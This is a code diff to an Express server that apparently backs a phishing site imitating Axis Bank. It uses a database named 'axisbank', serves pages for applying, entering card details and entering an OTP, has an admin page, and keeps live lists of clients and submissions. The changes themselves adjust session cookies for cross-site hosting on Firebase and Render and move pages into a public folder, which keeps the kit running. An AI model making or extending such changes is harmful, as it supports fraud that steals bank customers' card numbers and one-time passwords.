@@ -13,6 +13,9 @@ const MONGODB_URI = process.env.MONGODB_URI;
 const DB_NAME = process.env.DB_NAME || 'axisbank';
 const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret';
 const SESSION_TTL_MS = 1000 * 60 * 60 * 8;
+// When the pages are served from Firebase Hosting but the API runs here (Render),
+// the admin session cookie is cross-site. Browsers then require SameSite=None; Secure.
+const CROSS_SITE_COOKIES = process.env.CROSS_SITE_COOKIES === 'true';
 
 // MongoDB-backed session store (reuses the project's mongodb driver).
 // Avoids express-session's in-memory MemoryStore, which is not production-safe.
@@ -85,10 +88,15 @@ app.use(session({
   resave: false,
   saveUninitialized: false,
   store: sessionStore,
-  cookie: { httpOnly: true, sameSite: 'lax', maxAge: SESSION_TTL_MS }
+  cookie: {
+    httpOnly: true,
+    sameSite: CROSS_SITE_COOKIES ? 'none' : 'lax',
+    secure: CROSS_SITE_COOKIES,
+    maxAge: SESSION_TTL_MS
+  }
 }));
 
-app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname, 'public')));
 
 const clients = new Set();
 const recentSubmits = new Map();
@@ -118,11 +126,12 @@ function requireAuth(req, res, next) {
   return res.status(401).json({ error: 'Unauthorized' });
 }
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.htm')));
-app.get('/apply', (req, res) => res.sendFile(path.join(__dirname, 'apply.htm')));
-app.get('/card', (req, res) => res.sendFile(path.join(__dirname, 'card.htm')));
-app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'otp.htm')));
-app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
+const PUBLIC_DIR = path.join(__dirname, 'public');
+app.get('/', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.htm')));
+app.get('/apply', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'apply.htm')));
+app.get('/card', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'card.htm')));
+app.get('/otp', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'otp.htm')));
+app.get('/admin', (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'admin.html')));
 
 app.get('/ping', (req, res) => res.send('hello world'));
 
